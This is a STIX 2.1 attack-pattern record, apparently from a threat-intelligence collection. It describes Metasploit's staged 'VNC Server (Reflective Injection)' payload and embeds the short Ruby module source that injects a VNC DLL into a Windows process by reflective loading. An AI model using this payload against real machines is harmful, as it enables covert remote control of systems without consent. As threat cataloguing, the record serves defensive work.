{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5a89f4c-6f4b-4025-876b-c2e1684b6099",
    "created": "2024-08-14T16:33:19.253947Z",
    "modified": "2024-08-14T16:33:19.253951Z",
    "name": "VNC Server (Reflective Injection)",
    "description": "Inject a VNC Dll via a reflective loader (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/windows/vncinject.rb",
            "external_id": "vncinject.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Copyright (c) 2008 Stephen Fewer of Harmony Security (www.harmonysecurity.com)\n\n\n###\n#\n# Injects the VNC server DLL (via Reflective Dll Injection) and runs it over the established connection.\n#\n###\nmodule MetasploitModule\n\n  include Msf::Payload::Windows::ReflectiveDllInject\n  include Msf::Sessions::VncInjectOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'VNC Server (Reflective Injection)',\n      'Description'   => 'Inject a VNC Dll via a reflective loader (staged)',\n      'Author'        => [ 'sf' ],\n      'Session'       => Msf::Sessions::VncInject,\n      'Convention'    => 'sockedi -http -https'))\n\n  end\n\n  def library_path\n    File.join(Msf::Config.data_directory, \"vncdll.x86.dll\")\n  end\nend\n"
}